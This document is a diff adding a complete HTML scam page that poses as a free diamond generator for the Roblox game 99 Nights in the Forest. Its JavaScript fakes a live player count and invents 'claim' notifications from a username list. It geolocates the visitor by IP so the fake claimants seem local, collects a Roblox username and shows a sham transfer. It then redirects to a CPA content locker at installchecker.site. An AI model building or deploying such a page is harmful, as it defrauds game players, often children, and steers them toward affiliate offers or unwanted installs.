@@ -1,0 +1,730 @@
+<!DOCTYPE html><html lang="en" dir="ltr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>99 Nights in the Forest Diamond Generator - Free Diamonds Script | Auto Farm</title>
+    <meta name="description" content="Get unlimited diamonds in 99 Nights in the Forest! Free diamond generator, auto farm script, and diamond chest guide. Learn how to get diamonds fast with our working script.">
+    <meta name="keywords" content="99 nights in the forest diamond, 99 nights in the forest diamonds, roblox 99 nights in the forest diamond, 99 nights in the forest diamond script, 99 nights in the forest diamond farm, survive 99 nights in the forest diamond, 99 nights in the forest diamond farm script, 99 nights in the forest diamonds price, 99 nights in the forest diamond chest, 99 nights in the forest diamonds wiki, how to get diamonds in 99 nights in the forest, 99 nights in the forest diamond prices, how to get diamond in 99 nights in the forest, 99 nights in the forest script auto diamond pastebin, 99 nights in the forest auto diamond script, 99 nights in the forest auto diamond, 99 nights in the forest script auto diamond download, 99 nights in the forest auto farm diamond script, 99 nights in the forest auto farm diamond, 99 nights in the forest script auto collect diamond">
+    <meta name="robots" content="index, follow">
+    <meta name="author" content="99 Nights Diamond Generator">
+    <meta property="og:title" content="99 Nights in the Forest Diamond Generator - Free Diamonds Script">
+    <meta property="og:description" content="Get unlimited diamonds in 99 Nights in the Forest! Free diamond generator, auto farm script, and diamond chest guide.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="">
+    <meta property="og:image" content="images/unnamed.webp">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="99 Nights in the Forest Diamond Generator - Free Diamonds Script">
+    <meta name="twitter:description" content="Get unlimited diamonds in 99 Nights in the Forest! Free diamond generator, auto farm script, and diamond chest guide.">
+    <meta name="twitter:image" content="images/unnamed.webp">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Russo+One&display=swap" rel="stylesheet">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            box-sizing: border-box;
+            font-family: 'Poppins', Arial, sans-serif;
+            position: relative;
+            overflow-x: hidden;
+            text-align: left;
+            background-color: #05020c;
+        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url('https://tr.rbxcdn.com/180DAY-643b9b9285f3bd9b63cf392db12a4d87/768/432/Image/Webp/noFilter');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            filter: blur(5px);
+            z-index: -1;
+        }
+        .logo-container {
+            text-align: center;
+            padding-top: 15px;
+        }
+        .logo-container img {
+            max-width: 180px;
+            filter: drop-shadow(0 0 15px rgba(255, 0, 230, 0.6));
+            border-radius: 15px;
+        }
+        .content {
+            position: relative;
+            z-index: 1;
+        }
+        .top-bar {
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            padding: 16px 0 0 0;
+            margin-bottom: 8px;
+        }
+        .active-users-box {
+            background: rgba(10, 5, 25, 0.75);
+            border: 2px solid #6094ea;
+            border-radius: 13px;
+            padding: 13px 18px;
+            display: flex;
+            align-items: center;
+            font-size: 1.5em;
+            box-shadow: 0 0 15px rgba(96, 148, 234, 0.4);
+            font-weight: 600;
+            font-family: 'Poppins', Arial, sans-serif;
+            height: 54px;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .active-users-box span:first-child {
+            color: #fff;
+            margin-right: 8px;
+            font-weight: 600;
+            font-size: 1.1em;
+            letter-spacing: 1px;
+        }
+        .active-users-count {
+            font-weight: 900;
+            font-family: 'Russo One', 'Poppins', Arial, sans-serif;
+            margin-left: 8px;
+            font-size: 1.15em;
+            color: #ff00e6;
+            text-shadow: 0 0 8px rgba(255, 0, 230, 0.8);
+        }
+        .select-title {
+            margin: 30px 0 24px 0;
+            text-align: center;
+            font-size: 1.9em;
+            color: #fff;
+            font-family: 'Russo One', Arial, sans-serif;
+            letter-spacing: .4px;
+            font-weight: 900;
+            text-shadow: 0 1px 5px rgba(0,0,0,0.5);
+            padding: 8px 0;
+            position: relative;
+        }
+        .select-title:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 25%;
+            width: 50%;
+            height: 3px;
+            background: linear-gradient(to right, transparent, #ff00e6, transparent);
+        }
+        .items-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 20px;
+            padding: 0 5%;
+            max-width: 1000px;
+            margin: 0 auto 40px auto;
+        }
+        .item-card {
+            background: rgba(10, 5, 25, 0.75);
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border: 2px solid #6094ea;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            will-change: transform;
+            overflow: hidden;
+            position: relative;
+        }
+        .item-status {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            padding: 2px 8px;
+            border-radius: 5px;
+            font-size: 0.7em;
+            font-weight: 600;
+            color: white;
+            z-index: 2;
+        }
+        .item-status.available {
+            background-color: rgba(22, 163, 74, 0.8); /* Green */
+        }
+        .item-status.popular {
+            background-color: rgba(217, 119, 6, 0.8); /* Amber */
+        }
+        .item-status.limited {
+            background-color: rgba(220, 38, 38, 0.8); /* Red */
+        }
+        .item-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(96, 148, 234, 0.4);
+            border-color: #ff00e6;
+        }
+        .item-card.selected {
+            border: 2px solid #ff00e6;
+            animation: neonGlow 1.5s infinite alternate;
+        }
+        @keyframes neonGlow {
+            from { box-shadow: 0 0 10px rgba(255, 0, 230, 0.5); }
+            to { box-shadow: 0 0 25px rgba(255, 0, 230, 0.9); }
+        }
+        .item-img {
+            width: 110px;
+            height: 110px;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+        .item-name {
+            font-size: 1.2em;
+            color: #fff;
+            font-family: 'Russo One', Arial, sans-serif;
+            text-align: center;
+            font-weight: 900;
+        }
+        .cliameds {
+            position: fixed;
+            bottom: 15px;
+            left: 15px;
+            z-index: 9999;
+        }
+        .message {
+            background-color: rgba(10, 5, 25, 0.85);
+            border: 1px solid #ff00e6;
+            backdrop-filter: blur(5px);
+            display: flex;
+            font-size: .8rem;
+            align-items: center;
+            padding: 10px 20px;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(255, 0, 230, 0.3);
+        }
+        .message .img img {
+            width: 50px;
+            border-radius: 50%;
+            height: 50px;
+            border: 2px solid #6094ea;
+        }
+        .message .more { margin-left: 10px; }
+        .message .more div:first-child { font-weight: bold; color: #fff; }
+        .message .more div:last-child { color: #ccc; font-weight: 600; }
+
+        .purchase-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background-color: #0a0519;
+            border: 1px solid #ff00e6;
+            box-shadow: 0 0 25px rgba(255, 0, 230, 0.4);
+            padding: 25px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+        .popup-header h3 { font-size: 24px; margin: 0; color: white; font-weight: 700; font-family: 'Russo One'; }
+        .item-popup-image {
+            width: 130px;
+            height: 130px;
+            object-fit: contain;
+            margin: 20px auto;
+        }
+        .item-confirm { font-size: 18px; margin: 15px 0; color: white; font-weight: 600; line-height: 1.4; }
+        .item-confirm span { color: #ff00e6; font-weight: bold; }
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            box-sizing: border-box;
+            background-color: rgba(255,255,255,0.1);
+            color: #fff;
+            border: 1px solid #6094ea;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+        }
+        .input-group input::placeholder { color: #aaa; }
+        .popup-buttons { display: flex; gap: 12px; margin-top: 25px; }
+        .cancel-btn, .free-btn {
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            flex: 1;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            font-family: 'Russo One';
+        }
+        .cancel-btn { background-color: #333; color: white; }
+        .cancel-btn:hover { background-color: #555; }
+        .free-btn { background: linear-gradient(90deg, #ff00e6, #6094ea); color: white; }
+        .free-btn:hover { filter: brightness(1.2); }
+        .folding { margin: 20px auto; width: 60px; height: 60px; position: relative; transform: rotateZ(45deg); }
+        .folding .sk-cube { float: left; width: 50%; height: 50%; position: relative; transform: scale(1.1); }
+        .folding .sk-cube:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ff00e6;
+            animation: sk-foldCubeAngle 2.4s infinite linear both;
+            transform-origin: 100% 100%;
+        }
+        .folding .sk-cube2 { transform: scale(1.1) rotateZ(90deg); }
+        .folding .sk-cube3 { transform: scale(1.1) rotateZ(180deg); }
+        .folding .sk-cube4 { transform: scale(1.1) rotateZ(270deg); }
+        .folding .sk-cube2:before { animation-delay: 0.3s; }
+        .folding .sk-cube3:before { animation-delay: 0.6s; }
+        .folding .sk-cube4:before { animation-delay: 0.9s; }
+        @keyframes sk-foldCubeAngle {
+            0%, 10% { transform: perspective(140px) rotateX(-180deg); opacity: 0; }
+            25%, 75% { transform: perspective(140px) rotateX(0deg); opacity: 1; }
+            90%, 100% { transform: perspective(140px) rotateY(180deg); opacity: 0; }
+        }
+        .searching-text { color: white; font-size: 18px; margin-top: 20px; }
+        .result-avatar {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 15px auto;
+            border: 3px solid #ff00e6;
+        }
+        .result-username { color: white; font-size: 20px; font-weight: bold; margin: 15px 0; }
+        .get-item-now-btn {
+            background: linear-gradient(90deg, #ff00e6, #6094ea);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px;
+            margin-top: 15px;
+            transition: all 0.3s;
+            font-family: 'Russo One';
+        }
+        .get-item-now-btn:hover { filter: brightness(1.2); }
+        .d-none { display: none !important; }
+        .user-error { color: #ff6b6b; font-size: 14px; margin-top: 10px; text-align: center; }
+
+        @media (max-width: 768px) {
+            .items-grid {
+                padding: 0 15px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .logo-container img {
+                max-width: 160px;
+            }
+            .active-users-box { font-size: 1.1em; padding: 9px 8px; height: 42px; }
+            .select-title { font-size: 1.5em; }
+            .items-grid { grid-template-columns: repeat(2, 1fr); gap: 15px; }
+            .item-img { width: 80px; height: 80px; }
+            .item-name { font-size: 1em; }
+            .popup-content { width: 90%; padding: 20px; }
+            .item-popup-image { width: 100px; height: 100px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="images/unnamed.webp" alt="99 Nights Logo">
+    </div>
+    <div class="content">
+        <div class="top-bar">
+            <div class="active-users-box">
+                <span>Active Players:</span>
+                <span class="active-users-count" id="activeUsersCount">306</span>
+            </div>
+        </div>
+        <div class="select-title">
+            SELECT YOUR DIAMOND PACKAGE
+        </div>
+        <div class="items-grid" id="itemsGrid">
+            <div class="item-card">
+                <div class="item-status available">Available</div>
+                <img class="item-img" src="images/765093.png" alt="100 Diamonds">
+                <div class="item-name">100</div>
+            </div>
+            <div class="item-card">
+                <div class="item-status available">Available</div>
+                <img class="item-img" src="images/765093.png" alt="300 Diamonds">
+                <div class="item-name">300</div>
+            </div>
+            <div class="item-card">
+                <div class="item-status available">Popular</div>
+                <img class="item-img" src="images/765093.png" alt="400 Diamonds">
+                <div class="item-name">400</div>
+            </div>
+            <div class="item-card">
+                <div class="item-status available">Available</div>
+                <img class="item-img" src="images/765093.png" alt="600 Diamonds">
+                <div class="item-name">600</div>
+            </div>
+            <div class="item-card">
+                <div class="item-status popular">Popular</div>
+                <img class="item-img" src="images/765093.png" alt="800 Diamonds">
+                <div class="item-name">800</div>
+            </div>
+            <div class="item-card">
+                <div class="item-status limited">1 Left</div>
+                <img class="item-img" src="images/765093.png" alt="1,000 Diamonds">
+                <div class="item-name">1,000</div>
+            </div>
+        </div>
+    </div>
+    <div class="cliameds"></div>
+    <div class="purchase-popup" id="purchase-popup">
+        <div class="popup-content"></div>
+    </div>
+    <audio id="dingSound" preload="auto" src="media/audio_63c49c13c8.mp3"></audio>
+    <audio id="clickSound" preload="auto" src="media/audio_5139288bda.mp3"></audio>
+    
+    <!-- CPA Locker Scripts Removed -->
+<!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-PXZF2Z55V6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PXZF2Z55V6');
+</script>
+
+    <script>
+        // --- Domain Lock Removed ---
+
+        // --- Configuration ---
+        const CPA_LOCKER_SCRIPT = function() {
+            // New locker from installchecker.site
+            window.location.href = 'https://installchecker.site/cl/i/m521m8';
+        };
+
+        // --- Active Users Count ---
+        function randomUsers() {
+            return Math.floor(Math.random() * (450 - 150 + 1)) + 150;
+        }
+        function updateActiveUsers() {
+            document.getElementById('activeUsersCount').textContent = randomUsers();
+        }
+        updateActiveUsers();
+        setInterval(updateActiveUsers, 4500);
+
+        // --- Live Claim Notifications ---
+        const avatars = [
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F886F6A2F04884003042CB1B133FF85E-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DB22938CEDD6F835BDC83517F22CF558-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F323BBE8809396771A9D3B009ABB7B6C-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-877FD313CF49AC230D6CDB0813384418-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-508B26B915327442310C15E05990262A-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D69F986644481AEE90D6BBB252BDD78B-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-2C45A19E70B6AAC621EBD8B2D0A6E42E-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-06DD1C00CA0EB2CCDF1E8E828D182573-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7E66C8AA069C27FAB434F332DFA7DE40-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-ED6E717A62E7C6DE57502AA232123D98-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A415CFB32D441BB6E1A96CA204BB0647-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4BA51E32FA674ED3D7A1CE66FE5AA40-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D317B719D555BB05A2AF522B512BFF23-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A7818BF2D5D4AC3CB6D5418A713BBB6C-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-AEC10DD31BD85B9706BB3567ED5A4BC5-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A9C2582009A1FDECCA18263C7A3C6FE8-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0E08B78408BB5614B39A026D36A9575D-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6C9E0AAEF821128DD48FB8A389C4A0B9-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-EA378FFC5001D147249CB2B3AAED2C05-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-151FF93EEB183449A06A4833E71938A3-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F47CC2E15DEC626448D15A9E66EF1762-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A654D4AEA6E04F5671471E0266B4EA62-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E9527F1E31B8A775C70C0022AF80FDC5-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D149EA2C4E77B7B6882D6C056B0B3772-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-3F0C92CED81F2936EA712517457CC982-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-B6530B4FCD3302ED31F4BD913E198D7F-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-16067DDF7E67005B57C8CA1BACBC8395-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-8EE17821CC0789141F9753763D593180-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A8B021C60924EE61CEF929236824C30F-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9C81A53E43F0D94E105F86CFCC350C5D-Png/150/150/AvatarHeadshot/Webp/noFilter',
+            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7D7B193935907A3816671468E709A849-Png/150/150/AvatarHeadshot/Webp/noFilter'
+        ];
+
+        const usernames = [
+            'Liliana_Cupcake1',
+            'PixelNinja123',
+            'ayoletgo',
+            'Dreamycloudxo',
+            'lily_l0llyp0p',
+            'lilypaddd11',
+            'Sisi_7901',
+            'him90236',
+            'Queenbee_mavi',
+            'reto21r',
+            'Emmagirl0916',
+            '3mmqza',
+            'parassinitu',
+            'laxyaaa',
+            'Battal_216',
+            'bangakumakan',
+            'DDDDEdZZ',
+            'Anhtomdepzai',
+            'XAGXcallYTCH',
+            'Moonee_Play',
+            'hotspot5671',
+            'CyberXIndo',
+            'AT111114',
+            'wDetrox',
+            'Eightnesses',
+            'EightPxth',
+            'Ishowspeedjr2nd',
+            'angel1789tay',
+            'gardenwindut',
+            'needscreativity',
+            'Richy_544'
+        ];
+
+        // User country data - will be populated with IP API
+        let userCountry = '';
+        let userCountryCode = '';
+        let countryUsers = {};
+        
+        // Global data object for country information
+        const globalDatas = { 
+            country_code: null, 
+            country_name: null, 
+            flagUrl: null, 
+        }; 
+        
+        // Fetch user's IP address and then country information
+        $.getJSON("https://api.ipify.org?format=json", function(data) { 
+            var ipAddress = data.ip; 
+            $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(response) { 
+                globalDatas.country_code = response.country_code; 
+                globalDatas.country_name = response.country_name; 
+                globalDatas.flagUrl = "https://flagcdn.com/w320/" + response.country_code.toLowerCase() + ".png"; 
+                
+                // Also update the existing variables for compatibility
+                userCountry = response.country_name;
+                userCountryCode = response.country_code.toLowerCase();
+                
+                // Initialize country users object with random usernames
+                const shuffledUsernames = [...usernames].sort(() => 0.5 - Math.random());
+                countryUsers[userCountryCode] = shuffledUsernames.slice(0, 10); // Assign 10 random users to user's country
+                
+                console.log('User country detected:', userCountry, 'Code:', userCountryCode);
+                
+                // Initialize notification profiles after country detection
+                initializeNotificationProfiles();
+            }); 
+        }).fail(function(error) {
+            console.error('Error fetching country data:', error);
+            userCountry = 'Unknown';
+            userCountryCode = 'us'; // Default to US flag if country detection fails
+            globalDatas.country_code = 'US';
+            globalDatas.country_name = 'United States';
+            globalDatas.flagUrl = 'https://flagcdn.com/w320/us.png';
+            
+            // Initialize notification profiles with default country
+            initializeNotificationProfiles();
+        });
+
+        let notificationProfiles = []; // Will be populated with {username, avatarUrl, country, flagUrl}
+        let notificationInterval;
+        let popupOpen = false;
+
+        function initializeNotificationProfiles() {
+            // Create notification profiles with new avatars and usernames
+            // ALL users will appear to be from the visitor's country
+            notificationProfiles = usernames.map((username, index) => ({
+                username: username,
+                avatarUrl: avatars[index % avatars.length], // Cycle through avatars
+                country: globalDatas.country_name || 'United States',
+                countryCode: globalDatas.country_code || 'US',
+                flagUrl: globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png'
+            }));
+            
+            startNotifications();
+        }
+
+        function startNotifications() {
+            if (popupOpen || notificationProfiles.length === 0) return;
+            notificationInterval = setInterval(function() {
+                if (popupOpen) return;
+                const profile = notificationProfiles[Math.floor(Math.random() * notificationProfiles.length)];
+                const html = `<div class="message"><div class="img"><img src="${profile.avatarUrl}" alt="${profile.username}'s avatar"></div><div class="more"><div>${profile.username} <img src="${profile.flagUrl}" style="width: 16px; height: 12px; margin-left: 5px; border-radius: 2px;" alt="${profile.country} flag"></div><div>GET 1000 <img src="images/765093.png" style="width: 16px; height: 16px; margin: 0 3px;" alt="diamond"> after complete task</div></div></div>`;
+                $(".cliameds").html(html).fadeIn();
+                setTimeout(() => $(".cliameds").fadeOut(), 4000);
+            }, 6000);
+        }
+
+        function stopNotifications() {
+            clearInterval(notificationInterval);
+            $(".cliameds").fadeOut();
+        }
+        
+        // --- Popup Logic ---
+        const showPurchasePopup = (itemName, itemImage) => {
+            popupOpen = true;
+            stopNotifications();
+            const popup = $('#purchase-popup');
+            const popupContent = popup.find('.popup-content');
+
+            popupContent.html(`
+                <div class="popup-header"><h3>Confirm Selection</h3></div>
+                <img src="${itemImage}" alt="${itemName}" class="item-popup-image">
+                <p class="item-confirm">Enter your username to receive <span>${itemName} Diamonds</span></p>
+                <div class="input-group">
+                    <input type="text" id="username-input" placeholder="Enter your Roblox username">
+                </div>
+                <div class="user-error d-none">Please enter a valid username</div>
+                <div class="popup-buttons">
+                    <button class="cancel-btn">Cancel</button>
+                    <button class="free-btn" id="search-user-btn">Continue</button>
+                </div>
+            `);
+            popup.css('display', 'flex');
+            $('#username-input').focus();
+        }
+
+        const closePurchasePopup = () => {
+            $('#purchase-popup').fadeOut(200);
+            popupOpen = false;
+            startNotifications();
+        }
+        
+        // --- API & State Management Logic ---
+        const showSearchingState = async (username, itemName, itemImage) => {
+            const popupContent = $('.popup-content');
+            popupContent.html(`
+                <div class="popup-header"><h3>Searching Account</h3></div>
+                <div style="text-align:center;padding:20px">
+                    <div class="folding"><div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div></div>
+                    <p class="searching-text">Searching for @${username}</p>
+                </div>
+            `);
+            
+            try {
+                // FIXED API: Using a reliable CORS proxy for official Roblox endpoints
+                const userResponse = await fetch('https://corsproxy.io/?https://users.roblox.com/v1/usernames/users', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify({ usernames: [username], excludeBannedUsers: true })
+                });
+                if (!userResponse.ok) throw new Error('User not found in initial search.');
+                const userData = await userResponse.json();
+                if (!userData.data || userData.data.length === 0) throw new Error('User not found.');
+                
+                const userId = userData.data[0].id;
+                
+                const thumbResponse = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
+                if (!thumbResponse.ok) throw new Error('Could not fetch avatar.');
+                const thumbData = await thumbResponse.json();
+                const avatarUrl = thumbData.data[0].imageUrl;
+
+                showSuccessState(username, avatarUrl, itemName, itemImage);
+            } catch (error) {
+                console.error('API Error:', error);
+                showErrorState(username, itemName, itemImage);
+            }
+        }
+
+        const showSuccessState = (username, avatarUrl, itemName, itemImage) => {
+            const popupContent = $('.popup-content');
+            popupContent.html(`
+                <div class="popup-header"><h3>Account Found</h3></div>
+                <div style="text-align:center;padding:20px">
+                    <img src="${avatarUrl}" class="result-avatar">
+                    <p class="result-username">@${username}</p>
+                    <button class="get-item-now-btn">Generate Diamonds</button>
+                </div>
+            `);
+        }
+
+        const showVerificationState = (username, itemName, itemImage) => {
+            const popupContent = $('.popup-content');
+            popupContent.html(`
+                <div class="popup-header"><h3>Verification</h3></div>
+                <div style="text-align:center;padding:20px">
+                    <div class="folding"><div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div></div>
+                    <p class="searching-text">Transferring ${itemName} Diamonds to @${username}</p>
+                </div>
+            `);
+            setTimeout(() => {
+                CPA_LOCKER_SCRIPT();
+                closePurchasePopup();
+            }, 3000);
+        }
+
+        const showErrorState = (username, itemName, itemImage) => {
+            const popupContent = $('.popup-content');
+            popupContent.html(`
+                <div class="popup-header"><h3>Error</h3></div>
+                <div style="text-align:center;padding:20px">
+                    <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
+                    <button class="get-item-now-btn" id="retry-btn">Try Again</button>
+                </div>
+            `);
+            $('#retry-btn').on('click', () => showPurchasePopup(itemName, itemImage));
+        }
+
+        // --- Event Listeners ---
+        $(document).ready(function() {
+            // Notification profiles will be initialized after country detection
+            const dingSound = document.getElementById('dingSound');
+            const clickSound = document.getElementById('clickSound');
+
+            $('.item-card').on('click', function() {
+                $('.item-card').removeClass('selected');
+                $(this).addClass('selected');
+                dingSound.currentTime = 0;
+                dingSound.play().catch(e => {});
+                
+                const itemName = $(this).find('.item-name').text().trim();
+                const itemImage = $(this).find('.item-img').attr('src');
+                showPurchasePopup(itemName, itemImage);
+            });
+
+            // Using event delegation for dynamically created elements
+            $(document).on('click', '.cancel-btn', closePurchasePopup);
+
+            $(document).on('click', '#search-user-btn', function() {
+                clickSound.currentTime = 0;
+                clickSound.play().catch(e => {});
+                const username = $('#username-input').val().trim();
+                if (!username) {
+                    $('.user-error').removeClass('d-none');
+                    return;
+                }
+                const selectedItem = $('.item-card.selected');
+                const itemName = selectedItem.find('.item-name').text().trim();
+                const itemImage = selectedItem.find('.item-img').attr('src');
+                showSearchingState(username, itemName, itemImage);
+            });
+
+            $(document).on('click', '.get-item-now-btn', function() {
+                clickSound.currentTime = 0;
+                clickSound.play().catch(e => {});
+                const username = $('.result-username').text().substring(1);
+                const selectedItem = $('.item-card.selected');
+                const itemName = selectedItem.find('.item-name').text().trim();
+                const itemImage = selectedItem.find('.item-img').attr('src');
+                showVerificationState(username, itemName, itemImage);
+            });
+        });
+    </script>
+
+
+
+</body></html>
